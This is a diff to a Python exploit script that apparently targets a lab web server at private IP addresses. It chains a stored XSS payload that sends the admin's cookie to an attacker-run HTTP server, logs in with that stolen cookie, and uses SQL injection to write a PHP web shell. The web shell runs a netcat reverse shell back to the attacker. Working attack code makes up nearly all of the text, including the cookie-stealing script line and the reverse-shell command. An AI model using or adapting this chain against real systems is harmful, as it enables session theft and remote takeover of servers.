@@ -15,6 +15,7 @@ import requests
 import sys
 import random
 import socket
+from time import sleep
 
 
 # Class S to server as the http server handler to receive the requests with the admin cookie.
@@ -42,6 +43,7 @@ def exploit(server_class=HTTPServer, handler_class=S, port=8080):
 
     # 0. Send request to instantiate the stored XSS exploit that sends the admin cookie back to our server.
     logging.info('1. Stored XSS Payload: Sending...')
+    sleep(2)
     session = requests.Session()
 
     # Send an HTTP POST request an existing comment with the stored XSS payload to send the cookie of any user navigating to this page back to our server.
@@ -52,6 +54,7 @@ def exploit(server_class=HTTPServer, handler_class=S, port=8080):
 
     if int(response.status_code) == 200:
         logging.info("1. Stored XSS Payload: Success!\n")
+        sleep(2)
     else:
         sys.exit("1. Stored XSS Payload: Didn't work...Exiting")
 
@@ -71,6 +74,7 @@ def exploit(server_class=HTTPServer, handler_class=S, port=8080):
         pass
     httpd.server_close()
     logging.info('2. Admin Cookie Capture: Received Request - Stopping server.')
+    sleep(2)
 
     # 2. Authenticate into the website as an admin with the admin cookie we pulled from our HTTP server.
     # Establish a session.
@@ -83,6 +87,7 @@ def exploit(server_class=HTTPServer, handler_class=S, port=8080):
     response = requests.get('http://192.168.0.228/admin',cookies=cookies,verify=False)
     if "Logout" in str(response.content):
         logging.info("2. Admin Cookie Capture: Confirmed we are admin!\n")
+        sleep(2)
     else:
         sys.exit("2. Admin Cookie Capture: Didn't work...Exiting :(")
 
@@ -90,49 +95,29 @@ def exploit(server_class=HTTPServer, handler_class=S, port=8080):
     ## Generate random number to make each request (likely) unique.
     random_number = random.randint(0,100)
     logging.info("3. Reverse Shell: Writing reverse shell payload to server...")
+    sleep(2)
     response = requests.get('http://192.168.0.228/admin/edit.php?id=0 union select 1,"<?php exec(\'nc -e /bin/sh 192.168.0.102 9001\')?>",3,4 into outfile "/var/www/css/proof_'+str(random_number)+'.php"', cookies=cookies, verify=False)
-    logging.info(response.request.url)
     ## Confirm that the file has been written to disk.
     response = requests.get('http://192.168.0.228/css/')
     if "proof_"+str(random_number)+".php" in str(response.content):
         logging.info("3. Reverse Shell: Confirmed reverse shell payload written to server!\n")
+        sleep(2)
     else:
         sys.exit("3. Reverse Shell: Didn't work...Exiting :(")
 
     # 4. Reverse Shell Listener
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'
+    logging.info("4. Reverse Shell Command: Open up a reverse shell listener with \"nc -lvnp 9001\"")
+    sleep(2)
+    acknowledge = input("4. Reverse Shell Command: Enter in \"Ready\" to acknowledge your shell is open ->")
+    if acknowledge == "Ready":
+        logging.info("4. Reverse Shell Command: Sending reverse shell!")
+        sleep(2)
+        response = requests.get('http://192.168.0.228/css/proof_'+str(random_number)+'.php')
+        sys.exit("4. Reverse Shell Command: Reverse Shell Closed...Exiting")
+        sleep(2)
 
-    s.bind(("192.168.0.102", 9001)) # define the kali IP and the listening port
-    s.listen(1) # define the backlog size, since we are expecting a single connection from a single
-                                                            # target we will listen to one connection
-    logging.info("4. Reverse Shell Command: Listening...")
-
-    # response = requests.get('http://192.168.0.228/css/proof_'+str(random_number)+'.php')
-
-    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
-                                # port in a tuple format (IP,port)
-
-    logging.info("4. Reverse Shell Command: We got a connection!")
-
-
-    while True:
-
-        print(f"{addr[0]}:{addr[1]} Connected!")
-        cwd = conn.recv(1024).decode()
-        print("[+] Current working directory:", cwd)
-
-        command = input(f"{cwd} $> ") # Get user input and store it in command variable
-
-        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
-            conn.send('terminate')
-            conn.close()
-            break
-
-        else:
-            conn.send(command.encode()) # Otherwise we will send the command to the target
-
-            print(conn.recv(1024).decode()) # and print the result that we got back
-
+    else:
+        logging.info("4. Reverse Shell Command: Didn't receive acknowledgement...Exiting")
 
 # Main function that runs when executing the script.
 if __name__ == '__main__':
@@ -142,15 +127,3 @@ if __name__ == '__main__':
         exploit(port=int(argv[1]))
     else:
         exploit()
-
-
-# # TODO:
-# 0. Send the XXS code to the comment.
-# <script>(new Image()).src = "http://192.168.0.102:8080/?cookie=" + document.cookie;</script>
-
-# 2. Send the GET request with exploit code to write to the server.  Ideal to use some exploit code from MSF?
-## Exploit GET request to write content to the server in the css folder where we have access.  We just have to do a GET at the dropped location to activate exploit.
-## http://192.168.0.228/admin/edit.php?id=0%20union%20select%201,%22file%20written%20successfully!%22,3,4%20into%20outfile%20%27/var/www/css/proof.txt%27
-
-# 3. Set up a listener for the reverse shell to represent a shell.
-# 4. Sent GET request to run the exploit code by displaying the web page.
